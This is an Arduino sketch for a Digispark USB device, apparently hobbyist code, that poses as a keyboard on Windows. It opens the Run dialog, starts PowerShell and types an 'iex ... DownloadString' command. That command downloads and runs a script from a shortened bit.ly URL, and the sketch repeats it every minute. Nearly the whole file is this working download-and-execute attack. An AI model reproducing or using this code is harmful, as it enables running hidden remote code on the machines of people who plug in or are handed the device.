// Digispark Powershell Launcher

#include "DigiKeyboard.h"

// issues
// fails to launch on 1st loop then seems to work
// works on Windows only (change RUN command

void setup() {
  delay(500);
  DigiKeyboard.update();
  delay(500);
}

void loop() {
  // seems wonky on the 1st run then works, hoping a delay helps
  delay(60000);
  DigiKeyboard.update();
  delay(3000);  
  //open the RUN command
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  // delay for the RUN window to start
  delay(1000);
  // launch PowerShell
  DigiKeyboard.println("powershell");     //prints 'powershell' in RUN 
  delay (1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  // sends an <enter> 
  // delay for PowerShell to launch
  delay(1000);
  // send the command
  DigiKeyboard.println("iex (New-Object Net.WebClient).DownloadString(\"http://bit.ly/e0Mw9w\")");
  // you can open anything now
  //DigiKeyboard.println("notepad");
  // long delay
  // should set this for a longer time, at least long enough for the song to complete
  // but this annoying when trying to test so commenting out
  //delay(60000);
  
}
